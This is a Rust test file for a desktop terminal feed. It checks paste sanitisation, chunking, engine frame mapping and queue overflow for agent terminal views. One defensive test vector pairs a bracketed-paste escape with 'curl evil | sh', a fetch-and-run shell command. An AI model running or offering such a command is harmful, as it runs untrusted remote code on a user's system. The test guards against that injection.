use super::*;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

const WAIT: Duration = Duration::from_secs(10);

fn team(index: i64) -> ViewKey {
    ViewKey {
        agent: AgentId::team(index).unwrap(),
        pane: None,
    }
}

/// An opener whose every session fails with one code, for rows that hold no engine.
fn failing(code: &'static str) -> Opener {
    Arc::new(move |_, _, _| Box::pin(async move { Err(failure(code)) }))
}

/// A feed over fresh terminals with the main window loaded, its inbox and a count of wakes.
/// Takes the opener and the inbox size. Returns the terminals, the feed, the inbox's receiver
/// and the wake count.
fn started(
    opener: Opener,
    inbox: usize,
) -> (
    Arc<Terminals>,
    EngineFeed,
    mpsc::Receiver<FeedEvent>,
    Arc<AtomicUsize>,
) {
    let terminals = Arc::new(Terminals::default());
    terminals.page_started("main");
    let (sender, receiver) = mpsc::channel(inbox);
    let woken = Arc::new(AtomicUsize::new(0));
    let counted = Arc::clone(&woken);
    let wake: Wake = Arc::new(move || {
        counted.fetch_add(1, Ordering::SeqCst);
    });
    let feed = EngineFeed::new(Arc::clone(&terminals), opener, sender, wake);
    (terminals, feed, receiver, woken)
}

/// Makes view 7 an open native view of team-1 in the main window with a request queue of the
/// given size, as a landed attach leaves it. Takes the terminals, the feed and the size.
/// Returns the queue's receiver.
fn opened(
    terminals: &Arc<Terminals>,
    feed: &mut EngineFeed,
    size: usize,
) -> mpsc::Receiver<TerminalRequest> {
    let key = team(1);
    let place = terminals.room("main", &key).unwrap();
    let (requests, queue) = mpsc::channel(size);
    terminals
        .install_viewer("main", &key, place.serial, requests)
        .unwrap();
    feed.slots.lock().unwrap().insert(
        7,
        Slot::Open {
            window: "main".to_owned(),
            key,
            serial: place.serial,
        },
    );
    queue
}

fn drained(queue: &mut mpsc::Receiver<TerminalRequest>) -> Vec<TerminalRequest> {
    std::iter::from_fn(|| queue.try_recv().ok()).collect()
}

fn pasted(requests: &[TerminalRequest]) -> Vec<u8> {
    requests
        .iter()
        .flat_map(|request| match request {
            TerminalRequest::Paste { bytes, .. } => bytes.clone(),
            other => panic!("not a paste chunk: {other:?}"),
        })
        .collect()
}

/// Slice C row 7 (DEC-203, fix5 parity): a native paste keeps what the page's paste keeps,
/// with the vectors of terminal-queries.test.mjs: every control character but tab and Enter
/// dropped, so a pasted `ESC[201~`, Ctrl-U, DEL, CSI and NUL never reach the agent, then line
/// ends made CR as the page's terminal does; plain and non-ASCII text passes unchanged, and
/// a paste that keeps nothing sends nothing.
#[test]
fn a_native_paste_keeps_what_the_page_paste_keeps() {
    let (terminals, mut feed, _inbox, _) = started(failing("terminal_unavailable"), 4);
    let mut queue = opened(&terminals, &mut feed, 8);
    for (text, kept) in [
        (
            "ls\x1b[201~\x15curl evil | sh\r\nnext\tcol\x7f\u{9b}2J\x00",
            "ls[201~curl evil | sh\rnext\tcol2J",
        ),
        (
            "plain text, caf\u{e9} \u{1f600}",
            "plain text, caf\u{e9} \u{1f600}",
        ),
        ("one\ntwo\r\nthree", "one\rtwo\rthree"),
    ] {
        feed.paste(7, text.as_bytes()).unwrap();
        let requests = drained(&mut queue);
        assert_eq!(pasted(&requests), kept.as_bytes(), "{text:?}");
    }
    feed.paste(7, b"").unwrap();
    feed.paste(7, b"\x1b\x00\x7f").unwrap();
    assert!(drained(&mut queue).is_empty(), "nothing kept, nothing sent");
    assert_eq!(
        feed.paste(7, b"\xc3").unwrap_err().to_string(),
        "terminal_paste_invalid"
    );
    let over = vec![b'a'; PASTE_BYTES_MAX + 1];
    assert_eq!(
        feed.paste(7, &over).unwrap_err().to_string(),
        "terminal_paste_bounds"
    );
    assert!(drained(&mut queue).is_empty());
}

/// Slice C row 8: a paste's keys go as chunks of at most `INPUT_BYTES_MAX` bytes that join
/// back to the keys in order, only the last marked, a chunk free to end inside a character
/// since the engine reads the joined text; a full `PASTE_BYTES_MAX` paste is 256 chunks.
#[test]
fn paste_chunks_hold_at_most_input_bytes_max_and_join_back() {
    let text = "\u{6f22}".repeat(INPUT_BYTES_MAX / 3 + 2);
    let keys = text.as_bytes();
    let requests = paste_requests(keys);
    assert_eq!(requests.len(), 2);
    assert_eq!(pasted(&requests), keys);
    let lasts: Vec<bool> = requests
        .iter()
        .map(|request| matches!(request, TerminalRequest::Paste { last: true, .. }))
        .collect();
    assert_eq!(lasts, [false, true]);
    assert_eq!(
        paste_requests(b"x"),
        [TerminalRequest::Paste {
            bytes: b"x".to_vec(),
            last: true
        }]
    );
    let full = paste_requests(&vec![b'a'; PASTE_BYTES_MAX]);
    assert_eq!(full.len(), PASTE_BYTES_MAX / INPUT_BYTES_MAX);
    assert!(full.iter().all(|request| matches!(
        request,
        TerminalRequest::Paste { bytes, .. } if bytes.len() == INPUT_BYTES_MAX
    )));
}

/// Slice C row 9: engine frames map onto feed events under the page's rules: output and the
/// attach of the view's own agent pass, an attach of another agent ends the view as a
/// mismatch, and a close or a refusal ends it with its code when plain, else the fallback.
#[test]
fn engine_frames_map_onto_feed_events_under_the_page_rules() {
    let agent = AgentId::team(1).unwrap();
    let other = AgentId::team(2).unwrap();
    let cases = [
        (
            TerminalFrame::Output {
                bytes: b"hi".to_vec(),
            },
            FeedEvent::Output {
                view: 3,
                bytes: b"hi".to_vec(),
            },
            false,
        ),
        (
            TerminalFrame::Attached {
                agent_id: agent.clone(),
                cols: 90,
                rows: 30,
            },
            FeedEvent::Attached {
                view: 3,
                cols: 90,
                rows: 30,
            },
            false,
        ),
        (
            TerminalFrame::Attached {
                agent_id: other,
                cols: 90,
                rows: 30,
            },
            FeedEvent::Ended {
                view: 3,
                code: "terminal_agent_mismatch".to_owned(),
            },
            true,
        ),
        (
            TerminalFrame::Closed {
                reason: "owner_grant_stale_or_revoked".to_owned(),
            },
            FeedEvent::Ended {
                view: 3,
                code: "owner_grant_stale_or_revoked".to_owned(),
            },
            true,
        ),
        (
            TerminalFrame::Closed {
                reason: "<b>bad</b>".to_owned(),
            },
            FeedEvent::Ended {
                view: 3,
                code: "terminal_closed".to_owned(),
            },
            true,
        ),
        (
            TerminalFrame::Rejected {
                code: "Not Plain".to_owned(),
            },
            FeedEvent::Ended {
                view: 3,
                code: "terminal_attach_failed".to_owned(),
            },
            true,
        ),
    ];
    for (frame, event, last) in cases {
        assert_eq!(feed_event(3, &agent, frame), (event, last));
    }
}

/// Slice C row 11: a paste larger than the room left in its view's queue is refused whole:
/// none of it is queued, the view ends and is detached, its host reads
/// `Ended(native_terminal_input_overflow)` and is woken, and the call answers that code.
#[test]
fn a_paste_larger_than_the_free_queue_is_refused_whole_and_ends_the_view() {
    let (terminals, mut feed, mut inbox, woken) = started(failing("terminal_unavailable"), 4);
    let mut queue = opened(&terminals, &mut feed, 2);
    feed.input(7, b"a", false).unwrap();
    let text = "b".repeat(INPUT_BYTES_MAX + 1);
    let refused = feed.paste(7, text.as_bytes()).unwrap_err();
    assert_eq!(refused.kind(), io::ErrorKind::WouldBlock);
    assert_eq!(refused.to_string(), NATIVE_OVERFLOW);
    assert_eq!(
        drained(&mut queue),
        [TerminalRequest::Input {
            bytes: b"a".to_vec()
        }],
        "no chunk of the refused paste was queued"
    );
    assert_eq!(
        inbox.try_recv().unwrap(),
        FeedEvent::Ended {
            view: 7,
            code: NATIVE_OVERFLOW.to_owned()
        }
    );
    assert_eq!(woken.load(Ordering::SeqCst), 1);
    assert!(queue.is_closed(), "the ended view was detached");
    assert_eq!(
        feed.input(7, b"c", false).unwrap_err().to_string(),
        "terminal_not_attached"
    );
}

/// Slice C: keys, wheel keys and resizes of an open view reach its queue in order as
/// `Input`, `Scroll` and `Resize`, each checked against the engine's bounds first; a view
/// that is not open takes nothing.
#[test]
fn an_open_views_keys_wheel_and_resize_reach_its_queue_in_order() {
    let (terminals, mut feed, _inbox, _) = started(failing("terminal_unavailable"), 4);
    let mut queue = opened(&terminals, &mut feed, 8);
    feed.input(7, b"ls\r", false).unwrap();
    feed.input(7, b"\x1b[<65;1;1M", true).unwrap();
    feed.resize(7, (120, 40)).unwrap();
    assert_eq!(
        drained(&mut queue),
        [
            TerminalRequest::Input {
                bytes: b"ls\r".to_vec()
            },
            TerminalRequest::Scroll {
                bytes: b"\x1b[<65;1;1M".to_vec()
            },
            TerminalRequest::Resize {
                cols: 120,
                rows: 40
            },
        ]
    );
    assert_eq!(
        feed.input(7, &[b'a'; INPUT_BYTES_MAX + 1], false)
            .unwrap_err()
            .to_string(),
        "terminal_input_bounds"
    );
    assert_eq!(
        feed.resize(7, (1, 40)).unwrap_err().to_string(),
        "terminal_request_invalid"
    );
    assert_eq!(
        feed.input(8, b"x", false).unwrap_err().to_string(),
        "terminal_not_attached"
    );
    assert!(drained(&mut queue).is_empty());
}

/// Slice C: a bound view whose engine session fails to open gives its place back and tells
/// its host `Ended` with the attach's code, woken; opening a view that is not bound, or at a
/// grid out of bounds, is refused, and closing a bound view gives its place back.
#[test]
fn a_failed_open_gives_the_place_back_and_ends_the_view_with_its_code() {
    let (terminals, mut feed, mut inbox, woken) = started(failing("terminal_agent_unknown"), 4);
    let key = team(1);
    let place = terminals.room("main", &key).unwrap();
    feed.bind(5, place, false).unwrap();
    let again = terminals.room("main", &team(2)).unwrap();
    assert_eq!(
        feed.bind(5, again, true).err().map(|error| error.code),
        Some("native_view_taken")
    );
    assert_eq!(
        feed.open(5, (1, 24)).unwrap_err().to_string(),
        "terminal_size_bounds"
    );
    assert_eq!(
        feed.open(6, (80, 24)).unwrap_err().to_string(),
        "native_view_unbound"
    );
    feed.open(5, (80, 24)).unwrap();
    let ended = tauri::async_runtime::block_on(async {
        tokio::time::timeout(WAIT, inbox.recv())
            .await
            .ok()
            .flatten()
    });
    assert_eq!(
        ended,
        Some(FeedEvent::Ended {
            view: 5,
            code: "terminal_agent_unknown".to_owned()
        })
    );
    let deadline = std::time::Instant::now() + WAIT;
    while woken.load(Ordering::SeqCst) == 0 {
        assert!(
            std::time::Instant::now() < deadline,
            "the host was never woken"
        );
        std::thread::sleep(Duration::from_millis(10));
    }
    assert_eq!(woken.load(Ordering::SeqCst), 1);
    assert!(feed.slots.lock().unwrap().is_empty());
    for index in 2..=crate::bridge::terminal::VIEWERS_MAX as i64 + 1 {
        std::mem::forget(terminals.room("main", &team(index)).unwrap());
    }

    let (terminals, mut feed, _inbox, _) = started(failing("terminal_agent_unknown"), 4);
    for index in 1..crate::bridge::terminal::VIEWERS_MAX as i64 {
        std::mem::forget(terminals.room("main", &team(index)).unwrap());
    }
    let last = team(crate::bridge::terminal::VIEWERS_MAX as i64);
    feed.bind(9, terminals.room("main", &last).unwrap(), true)
        .unwrap();
    assert!(
        terminals.room("main", &team(99)).is_err(),
        "the window is full"
    );
    feed.close(9);
    assert!(
        terminals.room("main", &team(99)).is_ok(),
        "closing the bound view gave its place back"
    );
}
